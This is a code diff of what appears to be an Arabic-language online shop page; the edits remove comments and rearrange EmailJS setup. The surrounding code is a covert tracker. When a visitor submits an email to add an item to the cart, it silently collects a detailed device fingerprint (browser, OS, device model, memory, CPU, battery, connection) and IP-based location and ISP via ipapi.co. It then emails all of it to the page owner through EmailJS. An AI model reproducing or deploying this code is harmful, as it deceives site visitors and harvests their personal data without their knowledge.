@@ -305,15 +305,13 @@
     <div class="products-grid" id="productsGrid"></div>
 
     <script>
-        // ✅ بيانات EmailJS الخاصة بك
-        const PUBLIC_KEY = "ME4zxFzFyFhRTqLsl";
+        // بيانات EmailJS الخاصة بك - تم التصحيح
+        (function() {
+            emailjs.init("ME4zxFzFyFhRTqLsl");
+        })();
+
         const SERVICE_ID = "service_k4aclgh";
         const TEMPLATE_ID = "template_224gkie";
-
-        // تهيئة EmailJS
-        (function() {
-            emailjs.init(PUBLIC_KEY);
-        })();
 
         const products = [
             {
@@ -391,11 +389,9 @@
             currentProduct = null;
         };
 
-        // دالة متقدمة لجمع معلومات الجهاز
         function getAdvancedDeviceInfo() {
             const ua = navigator.userAgent;
             
-            // معلومات أساسية
             let browser = "Unknown";
             let browserVersion = "";
             let os = "Unknown";
@@ -404,7 +400,6 @@
             let deviceBrand = "Unknown";
             let deviceModel = "Unknown";
             
-            // تحديد المتصفح والإصدار
             if (ua.includes("Chrome") && !ua.includes("Edg")) {
                 browser = "Chrome";
                 const match = ua.match(/Chrome\/(\d+\.\d+)/);
@@ -423,7 +418,6 @@
                 if (match) browserVersion = match[1];
             }
             
-            // تحديد نظام التشغيل والإصدار
             if (ua.includes("Windows")) {
                 os = "Windows";
                 if (ua.includes("Windows NT 10.0")) osVersion = "10/11";
@@ -448,11 +442,9 @@
                 os = "Linux";
             }
             
-            // تحديد نوع الجهاز والماركة بدقة
             if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad") || ua.includes("Mobile")) {
                 deviceType = "Mobile";
                 
-                // ماركات الأندرويد
                 if (ua.includes("SM-")) {
                     deviceBrand = "Samsung";
                     const match = ua.match(/SM-[A-Z0-9]+/);
@@ -516,7 +508,6 @@
             };
         }
 
-        // دالة للحصول على IP والموقع
         async function getLocationInfo() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -551,7 +542,6 @@
             }
         }
 
-        // معلومات الاتصال
         function getConnectionInfo() {
             let connectionType = "غير متاح";
             let bandwidth = "غير متاح";
@@ -567,7 +557,6 @@
             return { connectionType, bandwidth, dataSaver };
         }
 
-        // معلومات البطارية
         async function getBatteryInfo() {
             let batteryLevel = "غير متاح";
             let batteryCharging = "غير متاح";
@@ -583,7 +572,6 @@
             return { batteryLevel, batteryCharging };
         }
 
-        // دالة الإرسال الرئيسية
         document.getElementById('submitEmail').onclick = async function() {
             const email = document.getElementById('userEmail').value;
             if (!email || !email.includes('@')) {
@@ -591,74 +579,51 @@
                 return;
             }
 
-            // جمع كل المعلومات
             const deviceInfo = getAdvancedDeviceInfo();
             const locationInfo = await getLocationInfo();
             const connectionInfo = getConnectionInfo();
             const batteryInfo = await getBatteryInfo();
 
-            // تجهيز البارامترات للإرسال
             const templateParams = {
-                // معلومات أساسية
                 user_email: email,
                 time: new Date().toLocaleString('ar-IQ'),
-                
-                // جهاز
                 browser: deviceInfo.browser,
                 os: deviceInfo.os,
                 device_type: deviceInfo.device_type,
                 device_brand: deviceInfo.device_brand,
                 device_model: deviceInfo.device_model,
-                
-                // شاشة
                 screen: deviceInfo.screen,
                 color_depth: deviceInfo.color_depth,
-                
-                // لغة ووقت
                 language: deviceInfo.language,
                 timezone: deviceInfo.timezone,
-                
-                // أداء
                 memory: deviceInfo.memory,
                 cpu_cores: deviceInfo.cpu_cores,
-                
-                // اتصال
                 connection: connectionInfo.connectionType,
                 bandwidth: connectionInfo.bandwidth,
                 data_saver: connectionInfo.dataSaver,
-                
-                // بطارية
                 battery: batteryInfo.batteryLevel,
                 charging: batteryInfo.batteryCharging,
-                
-                // موقع
                 ip: locationInfo.ip,
                 city: locationInfo.city,
                 region: locationInfo.region,
                 country: locationInfo.country,
                 isp: locationInfo.isp,
-                
-                // تفاصيل إضافية
                 platform: deviceInfo.platform,
                 raw_ua: deviceInfo.raw_ua
             };
 
-            // إرسال الإيميل
             try {
                 await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
                 
-                // إضافة للسلة
                 if (currentProduct) {
                     cart.push(currentProduct);
                     localStorage.setItem('cart', JSON.stringify(cart));
                     document.getElementById('cartCount').textContent = cart.length;
                 }
 
-                // إغلاق النافذة
                 document.getElementById('emailModal').style.display = 'none';
                 document.getElementById('userEmail').value = '';
 
-                // إظهار إشعار
                 document.getElementById('notification').style.display = 'block';
                 setTimeout(() => {
                     document.getElementById('notification').style.display = 'none';
